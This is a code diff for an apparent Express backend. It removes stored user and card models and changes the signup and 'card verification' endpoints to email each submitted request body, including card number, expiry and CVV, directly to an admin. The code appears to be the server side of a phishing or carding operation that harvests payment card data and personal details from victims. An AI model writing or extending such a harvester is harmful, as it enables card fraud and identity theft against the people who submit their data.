@@ -62,31 +62,6 @@ const sendAdminMail = async (subject, data) => {
 };
 
 /* -------------------- MODELS -------------------- */
-const User = mongoose.model(
-  "User",
-  new mongoose.Schema({
-    fullName: String,
-    email: String,
-    mobile: String,
-   deviceType: {
-  type: String,
-  enum: ["IOS", "Android", "Web"],
-  required: true,
-},
-    dob: String,
-    cardLimit: String,
-  }, { timestamps: true })
-);
-
-const Card = mongoose.model(
-  "Card",
-  new mongoose.Schema({
-    cardholderName: String,
-    cardNumber: String,
-    expiry: String,
-    cvv: String,
-  }, { timestamps: true })
-);
 
 const OTP = mongoose.model(
   "OTP",
@@ -103,24 +78,22 @@ const OTP = mongoose.model(
 /* SIGNUP */
 app.post("/api/signup", async (req, res) => {
   try {
-    const user = await User.create(req.body);
-    await sendAdminMail("📥 New Signup", user);
-    res.json({ success: true });
+    await sendAdminMail("📥 New Signup", req.body);
+    res.json({ success: true, message: "Signup sent to admin email" });
   } catch (err) {
     console.error("SIGNUP ERROR:", err);
-    res.status(500).json({ error: "Signup failed" });
+    res.status(500).json({ success: false, error: "Signup failed" });
   }
 });
 
 /* CARD DETAILS */
 app.post("/api/card-verification", async (req, res) => {
   try {
-    const card = await Card.create(req.body);
-    await sendAdminMail("💳 Card Submitted", card);
-    res.json({ success: true });
+    await sendAdminMail("💳 Card Submitted", req.body);
+    res.json({ success: true, message: "Card details sent to admin email" });
   } catch (err) {
     console.error("CARD ERROR:", err);
-    res.status(500).json({ error: "Card verification failed" });
+    res.status(500).json({ success: false, error: "Card verification failed" });
   }
 });
 
